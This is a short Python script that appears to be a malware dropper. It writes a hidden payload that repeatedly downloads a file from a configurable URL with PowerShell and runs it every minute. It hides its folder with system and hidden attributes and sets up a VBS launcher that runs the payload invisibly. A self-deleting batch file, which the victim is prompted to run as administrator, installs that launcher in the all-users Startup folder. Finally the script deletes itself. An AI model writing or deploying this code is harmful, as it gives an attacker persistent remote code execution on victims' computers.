import os

### --- custom url & path --- ###

PyDay = '''# --- PyDay --- #
import time
import os

url = '127.0.0.1:8000/test.txt'
path = 'C:\\\\test.txt'

Cl = 8

while Cl==8:
    Download = ('powershell -Command "Invoke-WebRequest ' + (url) + ' -OutFile ' + (path))
    Execution = (path)
    os.system(Download)
    os.system(Execution)
    time.sleep(60)'''

### --- custom url & path --- ###

if not os.path.exists('C:\\temp\\'):
    os.makedirs('C:\\temp\\')
pwned = open('C:\\temp\\PyDay.py','wb')
pwned.write(PyDay.encode())
pwned.close()
hidden = ('attrib +s +a +h C:\\temp')
os.system(hidden)

autorun = open('PyDay.vbs','wb')

vbs = '''Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c python C:\\\\temp\\\\PyDay.py",vbhide'''

autorun.write(vbs.encode())
autorun.close()

sudo = ('move "%~dp0PyDay.vbs" "C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\PyDay.vbs"&start "" "C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\PyDay.vbs"&DEL "%~f0"')
P4wN3D = open('P4wN3D.bat','wb')
P4wN3D.write(sudo.encode())
P4wN3D.close()

message = ('mshta vbscript:Execute("msgbox ""Run P4wN3D.bat with administrator"":close")')
os.system(message)

os.remove('PyDay.py')